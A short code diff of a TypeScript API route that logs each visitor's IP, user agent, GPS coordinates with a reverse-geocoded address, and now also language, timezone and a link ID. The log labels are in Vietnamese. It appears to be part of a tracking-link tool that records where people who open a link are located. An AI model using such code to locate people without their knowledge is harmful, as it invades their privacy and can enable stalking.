@@ -23,20 +23,22 @@ async function getAddress(lat: number, lon: number): Promise<string> {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { lat, lon, acc, ip } = body;
+    const { lat, lon, acc, ip, lang, timezone, linkId } = body;
 
     const headersList = headers();
     const ua = headersList.get('user-agent') ?? 'unknown';
     
-    // Prioritize IP from client, fallback to headers
     const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
-    
-    // Clean up IPv6 mapped IPv4 addresses e.g. ::ffff:123.45.67.89
     const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
 
     let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
+    if (linkId) {
+      logData += `Link ID: ${linkId}\n`;
+    }
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
+    logData += `Ngôn Ngữ: ${lang || 'N/A'}\n`;
+    logData += `Múi Giờ: ${timezone || 'N/A'}\n`;
 
     if (lat !== undefined && lon !== undefined) {
       const address = await getAddress(lat, lon);
